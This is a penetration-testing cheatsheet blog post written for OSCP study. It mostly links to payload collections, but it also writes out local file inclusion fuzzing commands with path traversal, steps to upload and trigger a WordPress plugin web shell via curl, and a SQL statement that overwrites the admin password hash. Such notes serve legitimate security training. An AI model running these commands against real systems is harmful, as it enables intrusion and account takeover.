---
title: Webapplication Attacks
author: sKyW1per
category: "OSCP"
date: "2021-03-04 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### PayloadsAllTheThings
```
Directory traversal
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
LFI/RFI
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
File Uploads
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
Command injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
SQL injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```


###### LFI file lists
```
Linux LFI file directories
https://github.com/hussein98d/LFI-files

Then use the list to find out which ones work:
$ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt

Find out how many characters a wrong request is, then filter those out:
$ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
```

###### Apache Log Poisoning
```
Example:
https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d
```

###### SQL Cheatsheets
```
Pentestmonkey
https://pentestmonkey.net/category/cheat-sheet/sql-injection
BurpSuite
https://portswigger.net/web-security/sql-injection/cheat-sheet
```

###### WebDAV
```
$ cadaver http://192.168.1.1/
```

###### Wordpress Panel
```
Upload webshell in a plugin

$ cp /usr/share/seclists/Web-Shells/Wordpress/plugin-shell.php ./
$ zip plugin-shell.zip plugin-shell.php

Upload the ZIP as a plugin. Then run the webshell:
$ curl http://192.168.1.1/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
```

###### Example changing a wordpress password in MariaDB
```
https://codebeautify.org/wordpress-password-hash-generator
"password" $P$Bp430d4U/90Jjw8evTcM4ShXGZZkdv0

$ UPDATE wp_users SET user_pass = "$P$Bp430d4U/90Jjw8evTcM4ShXGZZkdv0" WHERE ID=1;
then verify with:
$ select * from wp_users;

Then login with username:"password"
```
